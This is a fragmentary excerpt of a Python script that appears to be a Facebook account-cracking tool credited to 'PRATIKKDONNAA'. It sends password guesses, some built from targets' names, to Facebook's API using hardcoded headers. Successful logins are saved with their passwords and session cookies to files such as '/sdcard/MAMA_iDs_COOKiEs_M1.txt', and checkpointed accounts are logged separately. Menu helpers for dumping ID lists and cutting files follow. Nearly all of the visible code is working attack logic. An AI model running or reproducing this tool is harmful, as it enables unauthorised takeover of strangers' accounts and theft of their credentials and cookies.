...
/_______  /\_______  /\____|__  /\____|__  /\____|__  /
        \/         \/         \/         \/         \/
\033[1;37m Owner   :     PRATIKKDONNAA
\033[1;37m Facebook:     YUBRAJ HERE
\033[1;37m Github  :    PRIVATE 
\033[1;37m Version :     V.0.1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\033[10;92m\033[1;91m[\033[1;92mDONNA-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mUSER\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[🍪]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                    oks.append(sid)
                    open('/sdcard/DONNA.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MAMA_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [DONNA-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/DONNA.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[DONNA] {loop} | M•2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
def p_dump():
    ...
    try:
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back DONNA Menu ")
        MAMA(allkey)
    except Exception as e:
        print("Error : %s"%e) 
...
def cutter():
    ...
    print(47*'-')
    input(f"{S} Press Enter To Back DONNA Menu ")
    MAMA(allkey)       
